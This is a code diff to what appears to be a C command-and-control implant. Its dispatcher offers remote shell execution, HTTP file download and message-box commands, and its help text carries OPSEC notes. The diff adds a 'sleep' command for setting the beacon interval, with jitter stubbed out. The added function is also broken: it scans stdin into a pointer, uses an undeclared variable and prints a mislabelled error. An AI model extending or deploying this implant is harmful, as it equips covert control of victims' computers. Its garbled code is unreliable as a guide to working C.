@@ -21,6 +21,7 @@ int parse_command(char* command, char* args, JsonData*);
 void shell(JsonData*, char* args);
 void get_file_http(JsonData*, char* args);
 void messagebox(JsonData*, char* args);
+void sleep(JsonData*, char* args);
 void help(JsonData*);
 
 // ====================
@@ -51,15 +52,18 @@ int parse_command(char* command, char* args, JsonData* response_struct)
     } else if (strcmp(command, "get_http") == 0) {
         DEBUG_LOG("[COMMAND] get_http...\n");
         get_file_http(response_struct, args);
-    }
-    else if (strcmp(command, "messagebox") == 0) {
+    } else if (strcmp(command, "messagebox") == 0) {
         DEBUG_LOG("[COMMAND] get_http...\n");
         messagebox(response_struct, args);
     } else if (strcmp(command, "help") == 0) {
         DEBUG_LOG("[COMMAND] help...\n");
         help(response_struct);
+    } else if (strcmp(command, "sleep") == 0) {
+        DEBUG_LOG("[COMMAND] sleep\n");
+        sleep(response_struct, args);
     } else {
         DEBUG_LOG("[COMMAND] Unknown command!\n");
+        response_struct->data = "Unknown command";
     }
     return 0;
 }
@@ -270,7 +274,31 @@ void messagebox(JsonData* response_struct, char* args) {
     response_struct->data = "Message box popped successfully";
 }
 
+void sleep(JsonData* response_struct, char* args) {
+    char* context = NULL; // Required for strtok_s & thread safety.
+    char* sleep_arg = strtok_s(args, " ", &context);
+    //char* jitter = strtok_s(NULL, " ", &context);
 
+    if (!sleep_arg) {
+        DEBUG_LOG("[ERROR] sleep: Expected: sleep\n");
+        return;
+    }
+
+    //shitty int check
+    if (scanf("%d", &sleep_arg) == 0) {
+        DEBUG_LOG("[ERROR] messagebox: Expected: <URL> <FilePath>\n");
+        response_struct->data = "[ERROR] sleep: Expected: <int: sleeptime (seconds)>";
+        return;
+    }
+
+    // If your function wants the value in **seconds**,
+// you can either store seconds directly or convert to milliseconds:
+    DWORD dwTime = (DWORD)seconds;  // or (DWORD)(seconds * 1000) if needed in ms
+
+    set_sleep_time(dwTime);
+    response_struct->data = "Sleep set successfully";
+    return;
+}
 void help(JsonData* response_struct)
 {
     const char* help_string = "Help:\n\
@@ -281,6 +309,8 @@ void help(JsonData* response_struct)
 		[ OPSEC: Runs a new cmd.exe process ]\n\
 	messagebox: (messagebox <str: title> <str: message>): Pop a messagebox with a message\n\
 		[ OPSEC: Shows on users screen ]\n\
+> Config Commands:\n\
+    sleep: (sleep <int: sleeptime (seconds)): How long to sleep for/update sleep time\n\
 ";
 
     response_struct->data = help_string;
